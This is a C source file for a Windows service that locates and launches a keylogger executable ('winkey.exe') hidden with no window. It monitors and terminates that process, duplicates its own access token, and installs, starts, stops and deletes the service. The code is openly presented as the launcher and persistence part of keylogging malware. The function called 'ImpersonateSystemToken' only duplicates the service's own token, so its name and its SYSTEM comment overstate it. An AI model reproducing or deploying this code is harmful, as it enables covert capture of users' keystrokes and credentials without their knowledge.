#pragma comment(lib, "advapi32.lib")

#include "../../inc/service_manager.h"


// Token impersonation and keylogger functions

BOOL ImpersonateSystemToken()
{
    HANDLE hToken = NULL;
    HANDLE hDuplicateToken = NULL;
    BOOL bResult = FALSE;

    // Get current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        SvcReportEvent(TEXT("OpenProcessToken"));
        return FALSE;
    }

    // Duplicate the token to get a primary token
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken))
    {
        SvcReportEvent(TEXT("DuplicateTokenEx"));
        CloseHandle(hToken);
        return FALSE;
    }

    // Set the token integrity level to SYSTEM (optional but recommended)
    // Impersonate the duplicated token
    if (!SetThreadToken(NULL, hDuplicateToken))
    {
        SvcReportEvent(TEXT("SetThreadToken"));
    }
    else
    {
        bResult = TRUE;
    }

    CloseHandle(hDuplicateToken);
    CloseHandle(hToken);
    return bResult;
}

BOOL LaunchKeylogger()
{
    _tprintf(TEXT("LaunchKeylogger"));

    if (IsKeyloggerRunning())
    {
        _tprintf(TEXT("Keylogger already running\n"));
        return TRUE;
    }

    TCHAR szKeyloggerPath[MAX_PATH];
    TCHAR szServicePath[MAX_PATH];

    // Get the path of the service executable itself
    if (!GetModuleFileName(NULL, szServicePath, MAX_PATH))
    {
         _tprintf(TEXT("GetModuleFileName failed (%d)\n"), GetLastError());
        SvcReportEvent(TEXT("GetModuleFileName"));
        return FALSE;
    }

     _tprintf(TEXT("Service path: %s\n"), szServicePath);

    // Extract directory from full service path
    TCHAR szServiceDir[MAX_PATH];
    StringCchCopy(szServiceDir, MAX_PATH, szServicePath);
    
    // Remove the executable name to get just the directory
    TCHAR* lastBackslash = _tcsrchr(szServiceDir, TEXT('\\'));
    if (lastBackslash)
    {
        *lastBackslash = TEXT('\0'); // Null-terminate at the last backslash
    }

    // Build path to keylogger in the same directory as service
    StringCchPrintf(szKeyloggerPath, MAX_PATH, TEXT("%s\\winkey.exe"), szServiceDir);

    _tprintf(TEXT("Looking for keylogger at: %s\n"), szKeyloggerPath);

    // Check if file exists
    DWORD dwAttrib = GetFileAttributes(szKeyloggerPath);
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        _tprintf(TEXT("Keylogger not found! Error: %d\n"), GetLastError());
        return FALSE;
    }
    _tprintf(TEXT("Keylogger found, launching...\n"));

    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    
    // Launch keylogger
    if (!CreateProcess(
        NULL,                   // No module name (use command line)
        szKeyloggerPath,        // Path to keylogger
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,       // Creation flags - no window
        NULL,                   // Use parent's environment block
        NULL,                   // Use parent's starting directory 
        &si,                    // Pointer to STARTUPINFO structure
        &gKeyloggerProcessInfo) // Pointer to PROCESS_INFORMATION structure
    )
    {
        _tprintf(TEXT("CreateProcess failed (%d)\n"), GetLastError());
        SvcReportEvent(TEXT("CreateProcess for keylogger"));
        return FALSE;
    }

    _tprintf(TEXT("Keylogger launched successfully! PID: %d\n"), gKeyloggerProcessInfo.dwProcessId);
    return TRUE;
}

BOOL IsKeyloggerRunning()
{
    if (gKeyloggerProcessInfo.hProcess == NULL)
        return FALSE;

    DWORD dwExitCode;
    if (GetExitCodeProcess(gKeyloggerProcessInfo.hProcess, &dwExitCode))
    {
        return (dwExitCode == STILL_ACTIVE);
    }
    
    return FALSE;
}

VOID TerminateKeylogger()
{
    if (gKeyloggerProcessInfo.hProcess != NULL)
    {
        if (IsKeyloggerRunning())
        {
            TerminateProcess(gKeyloggerProcessInfo.hProcess, 0);
            WaitForSingleObject(gKeyloggerProcessInfo.hProcess, 5000);
        }
        
        CloseHandle(gKeyloggerProcessInfo.hProcess);
        CloseHandle(gKeyloggerProcessInfo.hThread);
        
        gKeyloggerProcessInfo.hProcess = NULL;
        gKeyloggerProcessInfo.hThread = NULL;
        gKeyloggerProcessInfo.dwProcessId = 0;
        gKeyloggerProcessInfo.dwThreadId = 0;
    }
}

// Management functions

VOID __stdcall DoStartSvc()
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    SERVICE_STATUS_PROCESS ssStatus; 
    DWORD dwBytesNeeded;

    schSCManager = OpenSCManager( 
        NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS);  

    if (NULL == schSCManager) 
    {
        _tprintf(TEXT("OpenSCManager failed (%d)\n"), GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager, 
        szSvcName,
        SERVICE_ALL_ACCESS);  

    if (schService == NULL)
    { 
        _tprintf(TEXT("OpenService failed (%d)\n"), GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    

    if (!StartService(schService, 0, NULL))
    {
        _tprintf(TEXT("StartService failed (%d)\n"), GetLastError());
    }
    else 
    {
        _tprintf(TEXT("Service start pending...\n")); 
        
        // Wait a bit for service to start
        Sleep(2000);
        
        if (QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO,
            (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
        {
            if (ssStatus.dwCurrentState == SERVICE_RUNNING)
            {
                _tprintf(TEXT("Service started successfully.\n"));
            }
        }
    }

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}

VOID __stdcall DoStopSvc()
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    SERVICE_STATUS_PROCESS ssp;  // FIXED: Changed from ssStatus to ssp
    DWORD dwBytesNeeded;

    schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  

    if (NULL == schSCManager) 
    {
        _tprintf(TEXT("OpenSCManager failed (%d)\n"), GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager,         // SCM database 
        szSvcName,            // name of service 
        SERVICE_STOP | SERVICE_QUERY_STATUS);  

    if (schService == NULL)
    { 
        _tprintf(TEXT("OpenService failed (%d)\n"), GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    

    if (!ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
    {
        _tprintf(TEXT("ControlService failed (%d)\n"), GetLastError());
    }
    else
    {
        _tprintf(TEXT("Service stop pending...\n"));
        
        // Wait for service to stop
        Sleep(2000);
        
        if (QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO,
            (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))  // FIXED: Changed ssStatus to ssp
        {
            if (ssp.dwCurrentState == SERVICE_STOPPED)  // FIXED: Changed ssStatus to ssp
            {
                _tprintf(TEXT("Service stopped successfully.\n"));
            }
        }
    }

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}

VOID __stdcall DoDeleteSvc()
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;

    schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  

    if (schSCManager == NULL) 
    {
        _tprintf(TEXT("OpenSCManager failed (%d)\n"), GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager,       // SCM database 
        szSvcName,          // name of service 
        DELETE);            // need delete access 

    if (schService == NULL)
    { 
        _tprintf(TEXT("OpenService failed (%d)\n"), GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }

    if (!DeleteService(schService)) 
    {
        _tprintf(TEXT("DeleteService failed (%d)\n"), GetLastError()); 
    }
    else 
    {
        _tprintf(TEXT("Service deleted successfully\n")); 
    }
 
    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}